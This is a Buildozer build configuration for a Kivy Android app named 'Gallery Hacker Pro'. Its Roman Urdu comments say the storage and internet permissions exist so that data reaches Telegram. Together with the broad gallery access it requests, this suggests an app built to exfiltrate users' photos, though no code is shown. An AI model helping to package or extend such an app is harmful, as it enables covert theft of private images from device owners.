[app]

# (str) Title of your application
title = Gallery Hacker Pro

# (str) Package name
package.name = galleryhacker

# (str) Package domain (needed for android packaging)
package.domain = org.malik.hacker

# (str) Source code where the main.py is located
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.0.0

# (list) Application requirements
# Yahan 'requests' aur 'urllib3' lazmi hain internet ke liye
requirements = python3, kivy, requests, urllib3, certifi, chardet, idna

# (str) Custom source folders for requirements
# (list) Permissions
# Inke baghair Telegram par data nahi jayega
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (bool) Indicate if the application should be fullscreen
fullscreen = 1

# (list) Supported orientations
orientation = portrait

# (list) List of service to declare
services = 

# (str) Android entry point, default is ok
# (str) Android app theme, default is ok
android.theme = @android:style/Theme.NoTitleBar.Fullscreen

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1
